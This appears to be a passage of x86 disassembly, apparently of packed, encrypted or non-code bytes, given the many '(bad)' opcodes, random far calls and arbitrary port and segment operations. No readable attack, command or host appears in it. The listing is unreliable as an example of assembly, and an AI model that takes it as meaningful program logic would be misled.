  413698:	sbb    al,BYTE PTR [ebp-0x797bfdc2]
  41369e:	pushf  
  41369f:	stc    
  4136a0:	pop    edx
  4136a1:	mov    ecx,0x8983af5c
  4136a6:	mov    ecx,0x41df98c6
  4136ab:	dec    esp
  4136ac:	and    eax,0x834c9a19
  4136b1:	arpl   WORD PTR [edi-0x34c2361],dx
  4136b7:	out    dx,eax
  4136b8:	ja     0x413688
  4136ba:	jb     0x4136e9
  4136bc:	pop    ds
  4136bd:	cmp    dl,cl
  4136bf:	xchg   edx,eax
  4136c0:	shl    DWORD PTR [eax],0x77
  4136c3:	arpl   WORD PTR [edi],sp
  4136c5:	mov    ds:0x7cc1e559,eax
  4136ca:	int    0x56
  4136cc:	mov    ebx,0x39c84ea4
  4136d1:	add    esi,DWORD PTR [eax-0x5f]
  4136d4:	mov    edx,0x70b30d86
  4136d9:	inc    dh
  4136db:	mov    ds:0xaa1ce82f,al
  4136e0:	bound  esp,QWORD PTR [ebx+0x51]
  4136e3:	push   ds
  4136e4:	sub    bl,BYTE PTR [ebx+edi*4]
  4136e7:	mov    ds:0x218ae097,al
  4136ec:	jo     0x41370b
  4136ee:	inc    eax
  4136ef:	arpl   sp,sp
  4136f1:	test   dh,0xce
  4136f4:	sbb    bl,BYTE PTR [ecx]
  4136f6:	xor    ebx,DWORD PTR [esp+ebx*1]
  4136f9:	push   cs
  4136fa:	and    eax,0x32580386
  4136ff:	add    al,0x1a
  413701:	ins    BYTE PTR es:[edi],dx
  413702:	retf   
  413703:	add    BYTE PTR [eax-0x27],bh
  413706:	sbb    DWORD PTR [edx-0xc38a0f3],eax
  41370c:	push   es
  41370d:	cmp    al,0x4e
  41370f:	test   al,0x3
  413711:	jecxz  0x413788
  413713:	push   ecx
  413714:	lea    ecx,[eax-0x3b]
  413717:	pushf  
  413718:	aas    
  413719:	mov    esi,0xddb5a4fd
  41371e:	je     0x413769
  413720:	adc    bl,BYTE PTR [di]
  413723:	dec    ebp
  413724:	adc    ebp,DWORD PTR [eax]
  413726:	push   esi
  413727:	pop    ebx
  413728:	imul   esi,eax,0xd6b8edc3
  41372e:	or     al,0xab
  413730:	and    BYTE PTR [eax],0xa6
  413733:	mov    ebp,0xd73b59cd
  413738:	int    0x81
  41373a:	inc    edi
  41373b:	add    dl,BYTE PTR [eax]
  41373d:	xchg   ebp,eax
  41373e:	cs call 0xcc8852d2
  413744:	jae    0x4136fd
  413746:	cmp    ebp,DWORD PTR [eax]
  413748:	mov    dl,ah
  41374a:	(bad)  
  41374b:	adc    al,0x63
  41374d:	dec    esp
  41374e:	inc    ebp
  41374f:	sbb    BYTE PTR [edx],ah
  413751:	sub    ah,BYTE PTR [edx]
  413753:	call   0x7831:0xf724fc9d
  41375a:	(bad)  
  41375b:	xor    dl,cl
  41375d:	push   ss
  41375e:	xor    eax,0xf2eb1019
  413763:	jo     0x413776
  413765:	pop    ecx
  413766:	cmp    bl,BYTE PTR [ebx+ecx*4-0x743af72d]
  41376d:	es inc ebx
  41376f:	and    dh,dh
  413771:	pop    es
  413772:	xchg   edx,eax
  413773:	pop    ss
  413774:	or     ecx,DWORD PTR [ecx+0x64]
  413777:	lea    ebx,[ecx+0x44]
  41377a:	outs   dx,DWORD PTR ds:[esi]
  41377b:	je     0x41379b
  41377d:	sbb    DWORD PTR [edx-0x35],edx
  413780:	push   eax
  413781:	cmpxchg DWORD PTR [ebx-0x72],eax
  413785:	scas   eax,DWORD PTR es:[edi]
  413786:	lds    ecx,FWORD PTR [esi+0x4bb61c86]
  41378c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378e:	adc    esi,DWORD PTR [ebp-0x56]
  413791:	retf   0x70f9
  413794:	outs   dx,BYTE PTR ds:[esi]
  413795:	cmp    esi,ebp
  413797:	inc    esi
  413798:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41379a:	out    dx,al
  41379b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41379c:	mov    ?,WORD PTR [edi-0x292a7483]
  4137a2:	stos   BYTE PTR es:[edi],al
  4137a3:	out    0x41,al
  4137a5:	fisttp DWORD PTR [edx]
  4137a7:	fistp  WORD PTR ds:0x5b19c4fc
  4137ad:	push   0x55980242
  4137b2:	bound  esi,QWORD PTR [eax+0x4e585e]
  4137b8:	jmp    0x4137bb
  4137ba:	in     eax,dx
  4137bb:	scas   al,BYTE PTR es:[edi]
  4137bc:	ins    DWORD PTR es:[edi],dx
  4137bd:	xor    eax,0x13c56795
  4137c2:	xchg   ebx,eax
  4137c3:	jl     0x413755
  4137c5:	jbe    0x4137a8
  4137c7:	fld    st(5)
  4137c9:	int    0xbb
  4137cb:	ror    BYTE PTR ds:0x2f78feb8,cl
  4137d1:	lds    ebx,FWORD PTR [ecx+0x7e422bd5]
  4137d7:	fs mov al,0xe5
  4137da:	push   ds
  4137db:	pop    ds
  4137dc:	div    DWORD PTR [esi+0x24]
  4137df:	adc    eax,0x20cfc430
  4137e4:	loope  0x41379f
  4137e6:	adc    dl,BYTE PTR ds:0xab5401ac
  4137ec:	jnp    0x413805
  4137ee:	and    esi,DWORD PTR [ebp+eiz*4-0x20]
  4137f2:	test   eax,0x78a5a790
  4137f7:	pushf  
  4137f8:	xchg   edi,eax
  4137f9:	outs   dx,DWORD PTR ds:[esi]
  4137fa:	jnp    0x41384e
  4137fc:	les    edx,FWORD PTR [ecx+0x55]
  4137ff:	jo     0x41380e
  413801:	lea    ebp,[ecx]
  413803:	or     DWORD PTR [eax],edi
  413805:	jle    0x41380f
  413807:	loopne 0x41384b
  413809:	xor    al,0xdf
  41380b:	pop    ebp
  41380c:	push   es
  41380d:	jmp    0x8715:0x4d35a065
  413814:	imul   ebx,DWORD PTR [esi-0x23],0xffffffa0
  413818:	inc    esp
  413819:	clc    
  41381a:	sahf   
  41381b:	inc    ecx
  41381c:	cmc    
  41381d:	xor    dl,BYTE PTR [edi-0x529dab2d]
  413823:	je     0x41385f
  413825:	pop    ecx
  413826:	jl     0x41386c
  413828:	add    eax,0x16d41b29
  41382d:	outs   dx,BYTE PTR ds:[esi]
  41382e:	aas    
  41382f:	int3   
  413830:	pop    edi
  413831:	std    
  413832:	repnz xchg esi,eax
  413834:	jbe    0x41380e
  413836:	(bad)  
  413837:	adc    DWORD PTR [edx],edi
  413839:	add    eax,0xfe54c49f
  41383e:	in     eax,0x44
  413840:	sahf   
  413841:	int3   
  413842:	push   esi
  413843:	jae    0x413888
  413845:	nop
  413846:	les    ebx,FWORD PTR [ecx-0x32]
  413849:	lds    esp,FWORD PTR [eax]
  41384b:	call   0x226f:0xc47adbc9
  413852:	dec    ecx
  413853:	fdivr  QWORD PTR [edi+ebp*4+0x53fd42ee]
  41385a:	jo     0x4137f9
  41385c:	and    al,0x77
  41385e:	call   0xc5e4:0x586a6dc4
  413865:	fcom   QWORD PTR [ebx-0xc2fccdd]
  41386b:	arpl   WORD PTR [ebp+0xe24fb4d],bp
  413871:	and    al,0xdf
  413873:	mov    ch,0xe8
  413875:	lock or esp,edi
  413878:	add    esp,DWORD PTR [edi]
  41387a:	mov    eax,0xced1f330
  41387f:	call   0x979e0bdc
  413884:	fidivr DWORD PTR [esi]
  413886:	or     dl,bh
  413888:	clc    
  413889:	addr16 inc eax
  41388b:	push   cs
  41388c:	push   ebx
  41388d:	jecxz  0x413836
  41388f:	cmp    bh,BYTE PTR ds:0x1c467b86
  413895:	sahf   
  413896:	xchg   ebp,eax
  413897:	ins    BYTE PTR es:[edi],dx
  413898:	scas   eax,DWORD PTR es:[edi]
  413899:	mov    DWORD PTR [ecx+0x3f],eax
  41389c:	jg     0x413884
  41389e:	fsubr  DWORD PTR [ebx+0x7364c9c9]
  4138a4:	sub    DWORD PTR [esi+esi*4],eax
  4138a7:	loop   0x41389e
  4138a9:	(bad)  
  4138aa:	std    
  4138ab:	leave  
  4138ac:	sbb    edx,DWORD PTR [eax-0x61]
  4138af:	ss add eax,0x6848852a
  4138b5:	aad    0xd4
  4138b7:	adc    al,0xb4
  4138b9:	cmp    bl,BYTE PTR [ebx-0x54]
  4138bc:	sbb    al,0xc1
  4138be:	outs   dx,BYTE PTR ds:[esi]
  4138bf:	jmp    0x41392c
  4138c1:	js     0x413851
  4138c3:	jns    0x413894
  4138c5:	test   al,0x3f
  4138c7:	pop    ds
  4138c8:	ret    0x5778
  4138cb:	mov    cs,WORD PTR [edi-0x49]
  4138ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138cf:	or     ebp,DWORD PTR [edx-0x6152e64c]
  4138d5:	pop    ebx
  4138d6:	or     dl,cl
  4138d8:	mov    ds:0x573db02f,eax
  4138dd:	hlt    
  4138de:	push   edx
  4138df:	out    dx,eax
  4138e0:	enter  0x3acb,0x66
  4138e4:	pushf  
  4138e5:	add    al,0xcb
  4138e7:	test   BYTE PTR [esi+ebp*8-0x2c44c7a1],ch
  4138ee:	mov    DWORD PTR [edx-0x7fdc9f7c],ecx
  4138f4:	xchg   esp,eax
  4138f5:	cmp    DWORD PTR [edx],edx
  4138f7:	dec    edi
  4138f8:	push   cs
  4138f9:	ja     0x413896
  4138fb:	fcmovu st,st(4)
  4138fd:	push   esi
  4138fe:	jb     0x413956
  413900:	dec    edx
  413901:	jge    0x413938
  413903:	pop    ds
  413904:	xor    DWORD PTR [esp+ecx*1],ebp
  413907:	fsincos 
  413909:	fbstp  TBYTE PTR [ecx+esi*1+0x4a]
  41390d:	mov    dh,0xac
  41390f:	mov    edi,0xe3d57914
  413914:	and    ch,dl
  413916:	aaa    
  413917:	in     eax,0x99
  413919:	ror    edi,0x3e
  41391c:	sahf   
  41391d:	mov    eax,0xc87f9dbf
  413922:	or     cl,BYTE PTR [esi-0x14a63d50]
  413928:	dec    ebp
  413929:	es push edx
  41392b:	jecxz  0x41392e
  41392d:	push   cs
  41392e:	clc    
  41392f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413930:	add    eax,DWORD PTR [esi]
  413932:	push   edi
  413933:	sub    DWORD PTR ds:0xa8ecda23,ebp
  413939:	aas    
  41393a:	shr    BYTE PTR [eax],0x8
  41393d:	xor    edi,edx
  41393f:	call   0x3970b7e7
  413944:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413946:	int3   
  413947:	sbb    eax,eax
  413949:	cmp    BYTE PTR [ebx+0x2c99ad91],cl
  41394f:	and    bh,BYTE PTR [esi+0x72e847bc]
  413955:	(bad)  
  413956:	adc    DWORD PTR [edx],ebx
  413958:	sub    al,0x37
  41395a:	stc    
  41395b:	pop    ds
  41395c:	pop    esi
  41395d:	add    eax,0xb03dbc32
  413962:	push   esi
  413963:	push   esi
  413964:	push   0x5368c528
  413969:	idiv   DWORD PTR [edx]
  41396b:	cmp    eax,0x9b10e9c1
  413970:	cmp    cl,0x2a
  413973:	or     al,0x4
  413975:	ret    0x1c0f
  413978:	jl     0x4138fc
  41397a:	push   ebx
  41397b:	(bad)  
  41397c:	aaa    
  41397d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41397e:	mov    eax,0xa88aeec5
  413983:	in     al,dx
  413984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413985:	push   0x9680ff82
  41398a:	inc    ebx
  41398b:	das    
  41398c:	aaa    
  41398d:	adc    al,0xb3
  41398f:	dec    edx
  413990:	ds jo  0x413971
  413993:	and    al,0xe
  413995:	(bad)  
  413997:	in     al,dx
  413998:	push   esi
  413999:	xchg   ecx,eax
  41399a:	mov    eax,0x7537c166
  41399f:	cmp    al,0xcc
  4139a1:	aam    0x90
  4139a3:	inc    edi
  4139a4:	aad    0x18
  4139a6:	mov    dh,0x9b
  4139a8:	aad    0xc4
  4139aa:	pop    ss
  4139ab:	stc    
  4139ac:	dec    ecx
  4139ad:	mov    DWORD PTR [ebx],eax
  4139af:	push   edi
  4139b0:	cmp    bl,bl
  4139b2:	psubsw mm4,QWORD PTR [ecx]
  4139b5:	add    eax,0x82b3ccd9
  4139ba:	pushf  
  4139bb:	div    edx
  4139bd:	dec    ebx
  4139be:	xchg   edx,eax
  4139bf:	ja     0x413a1b
  4139c1:	fwait
  4139c2:	loop   0x413a12
  4139c4:	imul   BYTE PTR [eax+0x65]
  4139c7:	stc    
  4139c8:	sub    dl,cl
  4139ca:	cmp    al,0x7e
  4139cc:	push   es
  4139cd:	mov    eax,0x24225ce2
  4139d2:	in     al,0x9d
  4139d4:	sub    DWORD PTR [edi],ecx
  4139d6:	inc    edi
  4139d7:	pop    es
  4139d8:	jg     0x413972
  4139da:	lods   al,BYTE PTR ds:[esi]
  4139db:	dec    ecx
  4139dc:	or     BYTE PTR [esi+0x79031ff3],dh
  4139e2:	jmp    0x4139bd
  4139e4:	xor    BYTE PTR [ecx-0x29],0x47
  4139e8:	popf   
  4139e9:	(bad)  [esi+0x5840c961]
  4139ef:	cmp    al,0xc6
  4139f1:	mov    al,BYTE PTR [edi-0x45c020b5]
  4139f7:	ins    DWORD PTR es:[edi],dx
  4139f8:	retf   0x9d29
  4139fb:	(bad)  
  4139fc:	in     al,0x29
  4139fe:	sbb    BYTE PTR [ebp+0x53c0111c],al
  413a04:	fcom   DWORD PTR [ecx+0x6d]
  413a07:	mov    edx,0xe17cfd3c
  413a0c:	mov    ebx,0xdd4dcdaf
  413a11:	out    dx,al
  413a12:	jns    0x413a82
  413a14:	push   ss
  413a15:	addr16 jl 0x4139fd
  413a18:	sub    eax,0x166cc7c1
  413a1d:	mov    ds:0xa251c441,al
  413a22:	mov    eax,ds:0xae4d039f
  413a27:	in     al,0x51
  413a29:	fs mov esp,0x68b4e0e9
  413a2f:	nop
  413a30:	jmp    0x413a74
  413a32:	jae    0x413a65
  413a34:	into   
  413a35:	cmp    cl,BYTE PTR [ebx]
  413a37:	inc    ebp
  413a38:	jl     0x4139cd
  413a3a:	sbb    eax,0xb88e0ba3
  413a3f:	in     al,0xee
  413a41:	mov    eax,ds:0x3614ce69
  413a46:	lods   eax,DWORD PTR ds:[esi]
  413a47:	pop    ds
  413a48:	adc    eax,0x12791db2
  413a4d:	mov    ds:0x18381cff,eax
  413a52:	pop    ss
  413a53:	inc    eax
  413a54:	xor    ch,dh
  413a56:	nop
  413a57:	mov    al,0x2a
  413a59:	jge    0x413ab2
  413a5b:	imul   esi,DWORD PTR [ecx+0x62d0395a],0x6d
  413a62:	or     eax,0xfadbdbda
  413a67:	(bad)  
  413a68:	jnp    0x413a2c
  413a6a:	jge    0x4139fb
  413a6c:	cmc    
  413a6d:	mov    eax,ds:0xe94d01ad
  413a72:	push   ecx
  413a73:	js     0x413aed
  413a75:	mov    esi,0xacf2a9d4
  413a7a:	pop    eax
  413a7b:	div    BYTE PTR [edi-0x2a]
  413a7e:	and    esi,ecx
  413a80:	int3   
  413a81:	mov    dh,0x55
  413a83:	xor    BYTE PTR [eax+0x50],dl
  413a86:	sbb    eax,DWORD PTR [ecx-0x69]
  413a89:	mov    eax,0xdde00e4c
  413a8e:	jo     0x413a43
  413a90:	test   eax,0x58c12246
  413a95:	push   edi
  413a96:	neg    ebp
  413a98:	cmp    DWORD PTR [ebp-0x64],0x6bd6b849
  413a9f:	mov    ch,ah
  413aa1:	sahf   
  413aa2:	fwait
  413aa3:	mov    cl,BYTE PTR [edi-0x2c47066e]
  413aa9:	jge    0x413acd
  413aab:	pop    edx
  413aac:	add    DWORD PTR ds:0xd61eb052,ebx
  413ab2:	adc    eax,0x1684c5ee
  413ab7:	faddp  st(6),st
  413ab9:	ja     0x413a3f
  413abb:	push   ebp
  413abc:	dec    ecx
  413abd:	fcmovne st,st(0)
  413abf:	and    al,0x43
  413ac1:	ja     0x413a98
  413ac3:	call   0x1974:0xf3a8b21b
  413aca:	fadd   DWORD PTR [edx-0x468531fa]
  413ad0:	push   eax
  413ad1:	pop    ebx
  413ad2:	add    edi,DWORD PTR [eax]
  413ad4:	adc    DWORD PTR [eax],0x70fa8a76
  413ada:	sti    
  413adb:	adc    bl,BYTE PTR [ebx+0x13]
  413ade:	push   esi
  413adf:	mov    eax,ds:0xb9196361
  413ae4:	pop    es
  413ae5:	stc    
  413ae6:	loopne 0x413a73
  413ae8:	push   esp
  413ae9:	es cmp eax,0x55eded3c
  413aef:	push   edx
  413af0:	push   edx
  413af1:	mov    cl,0x52
  413af3:	push   ss
  413af4:	sbb    DWORD PTR [esi],edi
  413af6:	mov    BYTE PTR [edx+0x6a],dl
  413af9:	es xor eax,0xfde736e6
  413aff:	inc    edi
  413b00:	mov    bh,0xf2
  413b02:	jecxz  0x413b53
  413b04:	pop    ss
  413b05:	mov    edi,edi
  413b07:	push   ds
  413b08:	out    dx,eax
  413b09:	push   0x7b
  413b0b:	push   ebp
  413b0c:	popa   
  413b0d:	jp     0x413b3d
  413b0f:	mov    al,0x5
  413b11:	cmp    DWORD PTR [esi],0xffffffe4
  413b14:	addr16 dec esp
  413b16:	js     0x413b0e
  413b18:	(bad)  
  413b1a:	mov    cl,0x4c
  413b1c:	xor    al,0x13
  413b1f:	dec    edi
  413b20:	ret    
  413b21:	sub    al,0x55
  413b23:	jle    0x413b63
  413b25:	shl    BYTE PTR [ebx-0x3e],0x3d
  413b29:	test   BYTE PTR [edi],al
  413b2b:	cmp    edx,DWORD PTR [ebx+0x0]
  413b2e:	jg     0x413b8d
  413b30:	xor    eax,0x8555b8cf
  413b35:	push   esp
  413b36:	mov    ch,0x5a
  413b38:	(bad)  
  413b39:	out    0x8a,al
  413b3b:	ja     0x413acd
  413b3d:	imul   eax,ebp,0x41
  413b40:	lahf   
  413b41:	fcomp  QWORD PTR ds:0x5f6fb63
  413b47:	(bad)  
  413b49:	push   es
  413b4a:	ds mov ebx,0xc1625830
  413b50:	xor    ebx,DWORD PTR [edx]
  413b52:	sti    
  413b53:	cld    
  413b54:	(bad)  
  413b56:	shr    DWORD PTR [ecx-0x3784bef0],cl
  413b5c:	imul   eax,DWORD PTR [ebx],0xffffffb3
  413b5f:	test   al,0x9
  413b61:	pop    ds
  413b62:	mov    fs,WORD PTR [esi+0x67]
  413b65:	xchg   BYTE PTR [edx+eiz*8+0x8],ch
  413b69:	jg     0x413b83
  413b6b:	mov    cl,0x90
  413b6d:	dec    ebx
  413b6e:	cld    
  413b6f:	test   BYTE PTR [ecx-0x3977483e],0xf1
  413b76:	rcr    ebp,1
  413b78:	add    al,BYTE PTR [edi]
  413b7a:	mov    esp,0x644a4d6c
  413b7f:	add    al,ah
  413b81:	inc    eax
  413b82:	sbb    eax,0x74ce7d1b
  413b87:	xor    al,0x84
  413b89:	fwait
  413b8a:	cmp    cl,bl
  413b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8d:	scas   al,BYTE PTR es:[edi]
  413b8e:	test   al,0x96
  413b90:	pop    ebx
  413b91:	push   0x718f1d47
  413b96:	sbb    al,0xd5
  413b98:	push   esp
  413b99:	js     0x413bbc
  413b9b:	sbb    DWORD PTR [esi-0x69],0xffffff83
  413b9f:	pop    ebx
  413ba0:	jnp    0x413b8e
  413ba2:	clc    
  413ba3:	mov    ebp,0x6543d765
  413ba8:	add    ebx,DWORD PTR [edx]
  413baa:	dec    edi
  413bab:	daa    
  413bac:	in     eax,0x68
  413bae:	mov    esi,0xe362db52
  413bb3:	fidivr DWORD PTR [ecx]
  413bb5:	mov    al,BYTE PTR [ebx+0xc]
  413bb8:	mov    BYTE PTR [edx],0x28
  413bbb:	pop    esi
  413bbc:	int    0x98
  413bbe:	fs xor al,0x34
  413bc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc2:	in     eax,0xd6
  413bc4:	xor    dh,BYTE PTR [ebx+ebp*1+0x46]
  413bc8:	xchg   ecx,eax
  413bc9:	cld    
  413bca:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  413bcc:	jnp    0x413b7f
  413bce:	daa    
  413bcf:	pop    ss
  413bd0:	dec    eax
  413bd1:	js     0x413bca
  413bd3:	dec    ebp
  413bd4:	dec    edi
  413bd5:	add    ebp,DWORD PTR [ebx+esi*8-0x52759539]
  413bdc:	xchg   edx,eax
  413bdd:	mov    ebp,0xc9a4f96e
  413be2:	jl     0x413bb3
  413be4:	(bad)  
  413be5:	mul    DWORD PTR [ecx]
  413be7:	fidiv  WORD PTR [ebx+0x4b731670]
  413bed:	xor    ebx,DWORD PTR [ebx+eax*4+0x7f]
  413bf1:	sub    BYTE PTR [esi],dl
  413bf3:	mov    ds,esi
  413bf5:	fistp  QWORD PTR [ecx+edi*1+0x1c8fbf3c]
  413bfc:	sahf   
  413bfd:	and    ebx,esp
  413bff:	cmp    al,0x38
  413c01:	(bad)  
  413c03:	mov    edx,0x3f763bf3
  413c08:	ja     0x413c67
  413c0a:	or     ebp,DWORD PTR [ecx-0x5]
  413c0d:	dec    esi
  413c0e:	lods   al,BYTE PTR ds:[esi]
  413c0f:	inc    esp
  413c10:	xor    esi,DWORD PTR [esi]
  413c12:	sub    dl,BYTE PTR [ebp-0x1d]
  413c15:	sub    eax,0x4ecd1114
  413c1a:	(bad)  
  413c1b:	mov    dh,0x5e
  413c1d:	jns    0x413c68
  413c1f:	repnz sub BYTE PTR [edi+0x5b389146],bh
  413c26:	xchg   edi,eax
  413c27:	xchg   edx,eax
  413c28:	call   DWORD PTR [esi+0x5c]
  413c2c:	call   0xa287623d
  413c31:	sbb    esi,DWORD PTR [esi+0x69]
  413c34:	mov    eax,ds:0xc7ef9d81
  413c39:	mov    ebx,0xc6347ef9
  413c3e:	lahf   
  413c3f:	rol    BYTE PTR [ebx],0x2a
  413c42:	mov    cl,0x80
  413c44:	mov    bl,0xf2
  413c46:	sbb    DWORD PTR [edx+0x320c87a5],edx
  413c4c:	push   es
  413c4d:	(bad)
  413c52:	js     0x413c97
  413c54:	xlat   BYTE PTR ds:[ebx]
  413c55:	popa   
  413c56:	aad    0x99
  413c58:	jg     0x413c45
  413c5a:	rcr    DWORD PTR [edi+ecx*4-0x669dbdaa],1
  413c61:	call   0x7b77:0xe7b7f3d0
  413c68:	adc    ch,BYTE PTR [eax+0x73]
  413c6b:	imul   bp,WORD PTR [edi+esi*1+0x662107f8],0x3701
  413c75:	in     eax,0xb1
  413c77:	xlat   BYTE PTR ds:[ebx]
  413c78:	test   BYTE PTR [ebx],bh
  413c7a:	aam    0x30
  413c7c:	or     DWORD PTR [edi],esp
  413c7e:	iret   
  413c7f:	or     DWORD PTR [edx-0x3f],eax
  413c82:	or     al,0xfb
  413c84:	mov    al,ds:0xdb04e405
  413c89:	fisub  WORD PTR [esi]
  413c8b:	fdivr  DWORD PTR [edx+edx*8-0x5a]
  413c8f:	add    edi,DWORD PTR [ebx-0x21347f30]
  413c95:	call   0xb489:0xf4af0235
  413c9c:	les    esi,FWORD PTR ds:0xb8ac7b3d
  413ca2:	mov    cl,0x5b
  413ca4:	add    ebp,esi
  413ca6:	jmp    0x413d0a
  413ca8:	adc    eax,0xde66b517
  413cad:	mov    ebx,0x52b214c5
  413cb2:	xor    esp,DWORD PTR [ecx+0x51]
  413cb5:	aam    0xb5
  413cb7:	dec    esp
  413cb8:	jne    0x413cf0
  413cba:	jne    0x413cf9
  413cbc:	stos   DWORD PTR es:[edi],eax
  413cbd:	js     0x413c6d
  413cbf:	add    al,0x3c
  413cc1:	jl     0x413c51
  413cc3:	pusha  
  413cc4:	inc    ebx
  413cc5:	adc    al,0xf2
  413cc7:	push   0x2a
  413cc9:	mov    ds:0x92c5f79d,eax
  413cce:	stos   BYTE PTR es:[edi],al
  413ccf:	push   esp
  413cd0:	les    ebx,FWORD PTR [esi]
  413cd2:	jp     0x413c77
  413cd4:	and    al,0xd6
  413cd6:	out    dx,al
  413cd7:	mov    eax,ds:0x46ce9c61
  413cdc:	pop    esi
  413cdd:	clc    
  413cde:	xchg   esi,eax
  413cdf:	jecxz  0x413c6b
  413ce1:	push   0xe4c050d8
  413ce6:	add    bl,BYTE PTR [edi-0x2dec6dc6]
  413cec:	stos   DWORD PTR es:[edi],eax
  413ced:	push   eax
  413cee:	mov    edi,0xfd520dd5
  413cf3:	xchg   ebx,eax
  413cf4:	js     0x413d55
  413cf6:	and    al,0x4a
  413cf8:	das    
  413cf9:	pop    ss
  413cfa:	inc    ebx
  413cfb:	add    edi,0x3c2f99cc
  413d01:	pop    es
  413d02:	pop    ebp
  413d03:	das    
  413d04:	sar    BYTE PTR [eax],0x38
  413d07:	fdivr  QWORD PTR [edi]
  413d09:	mov    bh,0x13
  413d0b:	pop    edi
  413d0c:	and    eax,0x344dfdb
  413d11:	fwait
  413d12:	sbb    edx,DWORD PTR [esi-0x1e3e27f5]
  413d18:	mov    bl,BYTE PTR [edx]
  413d1a:	cmp    al,0x9e
  413d1c:	dec    esi
  413d1d:	or     BYTE PTR [ebx],al
  413d1f:	mov    esp,0xce8a322a
  413d24:	pop    ecx
  413d25:	sbb    BYTE PTR es:[edi-0x29],cl
  413d29:	and    edi,ecx
  413d2b:	mov    esp,0xb8af3181
  413d30:	xchg   DWORD PTR [ecx-0x2aeba546],ebx
  413d36:	inc    ebx
  413d37:	mov    bh,dl
  413d39:	dec    ebp
  413d3a:	mov    al,ds:0x5bcdfd5b
  413d3f:	sbb    BYTE PTR [ecx+0x6d],dh
  413d42:	sub    eax,esi
  413d44:	(bad)  
  413d45:	mov    ebx,0x488fbf94
  413d4a:	test   eax,0xe42fdc5e
  413d4f:	je     0x413d27
  413d51:	push   ds
  413d52:	cmp    ah,ch
  413d54:	aam    0xf8
  413d56:	xchg   ebp,eax
  413d57:	inc    ecx
  413d58:	call   0xf736:0x85add72d
  413d5f:	add    BYTE PTR [edi+0x22],bh
  413d62:	outs   dx,BYTE PTR ds:[esi]
  413d63:	loop   0x413d8c
  413d65:	jge    0x413db4
  413d67:	imul   ebp,DWORD PTR [esi+ebx*8-0x66],0x5bf6dbe4
  413d6f:	pop    eax
  413d70:	sbb    cl,BYTE PTR [eax-0x71]
  413d73:	fidivr WORD PTR [ebp+0x3c]
  413d76:	and    al,dh
  413d78:	loopne 0x413db8
  413d7a:	cmc    
  413d7b:	inc    edx
  413d7c:	test   eax,0xd85d286d
  413d81:	push   ebp
  413d82:	xchg   esi,eax
  413d83:	or     al,0x6
  413d85:	(bad)  
  413d86:	or     BYTE PTR [esi+0x13],al
  413d89:	inc    edx
  413d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d8b:	push   cs
  413d8c:	sti    
  413d8d:	jnp    0x413d3b
  413d8f:	sbb    al,0x90
  413d91:	push   esi
  413d92:	out    dx,eax
  413d93:	cld    
  413d94:	cmp    DWORD PTR [eax+0x52e19d7],0xb9f95768
  413d9e:	aam    0x34
  413da0:	or     cl,al
  413da2:	cli    
  413da3:	xor    dh,BYTE PTR [esi+0x24]
  413da6:	mov    ebx,DWORD PTR [eax-0x51bc2d4e]
  413dac:	dec    ecx
  413dad:	nop
  413dae:	and    DWORD PTR [esp+edi*2-0x2e],esp
  413db2:	mov    ss,WORD PTR [esi]
  413db4:	xor    bh,dh
  413db6:	lahf   
  413db7:	mov    DWORD PTR [edi-0x75],ebp
  413dba:	jnp    0x413e36
  413dbc:	xor    cl,BYTE PTR [ebx+eiz*2+0x54680d7b]
  413dc3:	inc    ecx
  413dc4:	out    0xfd,eax
  413dc6:	xor    al,BYTE PTR [ecx-0x42]
  413dc9:	jp     0x413d59
  413dcb:	bound  eax,QWORD PTR [ebx-0x3]
  413dce:	je     0x413d8a
  413dd0:	push   ss
  413dd1:	adc    DWORD PTR es:[eax-0x3c],eax
  413dd5:	daa    
  413dd6:	int3   
  413dd7:	inc    eax
  413dd8:	dec    BYTE PTR [ebx+0x47]
  413ddb:	inc    eax
  413ddc:	or     bh,dh
  413dde:	add    eax,0xec93f0d4
  413de3:	jns    0x413e54
  413de5:	inc    ecx
  413de6:	xor    BYTE PTR [ebx-0x9baaaef],ch
  413dec:	sub    al,0x26
  413dee:	outs   dx,BYTE PTR ds:[esi]
  413def:	dec    ebp
  413df0:	add    al,0x2c
  413df2:	or     al,bl
  413df4:	add    al,0x4b
  413df6:	sub    al,0x7f
  413df8:	ss call 0x5bcb:0xa4f7bc92
  413e00:	hlt    
  413e01:	push   ebp
  413e02:	pop    esp
  413e03:	push   ss
  413e04:	push   ds
  413e05:	mov    dl,0xe6
  413e07:	adc    eax,0x59f1b140
  413e0c:	jecxz  0x413dd5
  413e0e:	(bad)  
  413e11:	mov    ch,0xa6
  413e13:	inc    esp
  413e14:	mov    DWORD PTR [esi+0x4f],ebp
  413e17:	xchg   edi,edi
  413e19:	sub    ah,BYTE PTR [ebx+0x4c]
  413e1c:	mov    ebp,0x44b587d4
  413e21:	les    esp,FWORD PTR [eax-0x650f6382]
  413e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e28:	sub    ch,BYTE PTR [edx-0x38]
  413e2b:	jns    0x413e0a
  413e2d:	cwde   
  413e2e:	xor    DWORD PTR [edx],eax
  413e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e31:	sbb    eax,0x3ca84aac
  413e36:	xchg   edi,eax
  413e37:	and    edx,DWORD PTR [esi]
  413e39:	in     eax,0x88
  413e3b:	les    edi,FWORD PTR [edx+0x5a05ecf7]
  413e41:	jno    0x413ea2
  413e43:	fisub  WORD PTR [ebx+0x2d]
  413e46:	push   cs
  413e47:	xchg   ebx,eax
  413e48:	push   ds
  413e49:	clc    
  413e4a:	xor    DWORD PTR [edx+ebp*4],ebx
  413e4d:	repz sbb cl,BYTE PTR [edi-0x60]
  413e51:	xor    DWORD PTR [edi+0x63],ebp
  413e54:	cdq    
  413e55:	dec    ecx
  413e56:	pop    es
